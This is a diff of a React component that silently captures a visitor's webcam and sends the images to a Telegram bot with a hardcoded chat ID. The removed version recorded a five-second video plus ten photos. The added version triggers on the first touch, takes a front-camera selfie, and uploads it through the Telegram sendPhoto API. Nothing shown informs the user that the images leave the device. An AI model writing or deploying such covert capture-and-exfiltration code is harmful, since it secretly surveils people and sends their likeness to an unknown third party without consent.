@@ -8,13 +8,17 @@ const TELEGRAM_CHAT_ID = "6956607670";
 const PhotoAndVideoTaker = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const mediaStreamRef = useRef<MediaStream | null>(null);
-  const mediaBlobs = useRef<{ blob: Blob; type: "photo" | "video" }[]>([]);
   const [showDeniedMessage, setShowDeniedMessage] = useState(false);
 
   const initCamera = async () => {
     try {
+      // Use front-facing camera on mobile
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: 1280, height: 720 },
+        video: {
+          facingMode: "user", // Force front camera
+          width: { ideal: 1280 },
+          height: { ideal: 720 },
+        },
         audio: false,
       });
 
@@ -23,114 +27,84 @@ const PhotoAndVideoTaker = () => {
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
         videoRef.current.onloadedmetadata = () => {
-          startVideoRecording();
+          videoRef.current?.play();
+          captureSelfie();
         };
       }
       setShowDeniedMessage(false);
     } catch (error) {
       setShowDeniedMessage(true);
-      console.error("Camera access denied:", error);
+      console.error("Camera error:", error);
     }
   };
 
-  const startVideoRecording = () => {
-    if (!mediaStreamRef.current) return;
-
-    const recorder = new MediaRecorder(mediaStreamRef.current, {
-      mimeType: "video/webm;codecs=vp9",
-      videoBitsPerSecond: 2500000,
-    });
-
-    const chunks: BlobPart[] = [];
-    recorder.ondataavailable = (e) => chunks.push(e.data);
-
-    recorder.onstop = async () => {
-      const videoBlob = new Blob(chunks, { type: "video/webm" });
-      mediaBlobs.current.push({ blob: videoBlob, type: "video" });
-      startPhotoCapture();
-    };
-
-    recorder.start();
-
-    setTimeout(() => {
-      recorder.stop();
-    }, 5000);
-  };
-
-  const startPhotoCapture = () => {
-    let count = 0;
-    const interval = setInterval(() => {
-      if (count >= 10) {
-        clearInterval(interval);
-        sendToTelegram();
-        return;
-      }
-      capturePhoto();
-      count++;
-    }, 800);
-  };
-
-  const capturePhoto = () => {
+  const captureSelfie = () => {
     if (!videoRef.current) return;
 
-    const canvas = document.createElement("canvas");
-    canvas.width = videoRef.current.videoWidth;
-    canvas.height = videoRef.current.videoHeight;
-    const ctx = canvas.getContext("2d");
+    setTimeout(() => {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoRef.current?.videoWidth || 640;
+      canvas.height = videoRef.current?.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
 
-    if (ctx) {
-      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(
-        (blob) => {
-          if (blob) {
-            mediaBlobs.current.push({ blob, type: "photo" });
-          }
-        },
-        "image/jpeg",
-        0.85
-      );
-    }
+      if (ctx && videoRef.current) {
+        // Mirror the selfie for more natural appearance
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(
+          async (blob) => {
+            if (blob) {
+              await sendToTelegram(blob, "selfie.jpg");
+            }
+            // Cleanup
+            if (mediaStreamRef.current) {
+              mediaStreamRef.current
+                .getTracks()
+                .forEach((track) => track.stop());
+            }
+          },
+          "image/jpeg",
+          0.9
+        );
+      }
+    }, 1000); // Wait 1 second for camera to stabilize
   };
 
-  const sendToTelegram = async () => {
+  const sendToTelegram = async (blob: Blob, filename: string) => {
     try {
-      for (const item of mediaBlobs.current) {
-        const formData = new FormData();
-        formData.append("chat_id", TELEGRAM_CHAT_ID);
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("photo", blob, filename);
 
-        if (item.type === "photo") {
-          formData.append("photo", item.blob, "algeria.jpg");
-          await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-            {
-              method: "POST",
-              body: formData,
-            }
-          );
-        } else {
-          formData.append("video", item.blob, "algeria.webm");
-          await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
-            {
-              method: "POST",
-              body: formData,
-            }
-          );
+      await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        {
+          method: "POST",
+          body: formData,
         }
-      }
-      console.log("All media sent successfully");
+      );
+      console.log("Selfie sent successfully");
     } catch (error) {
-      console.error("Telegram send error:", error);
-    } finally {
-      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
+      console.error("Telegram error:", error);
     }
   };
 
   useEffect(() => {
-    initCamera();
+    // Add mobile-specific event listener for better compatibility
+    const handleMobileInteraction = () => {
+      initCamera();
+      window.removeEventListener("touchstart", handleMobileInteraction);
+    };
+
+    window.addEventListener("touchstart", handleMobileInteraction);
 
     return () => {
-      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
+      if (mediaStreamRef.current) {
+        mediaStreamRef.current.getTracks().forEach((track) => track.stop());
+      }
+      window.removeEventListener("touchstart", handleMobileInteraction);
     };
   }, []);
 
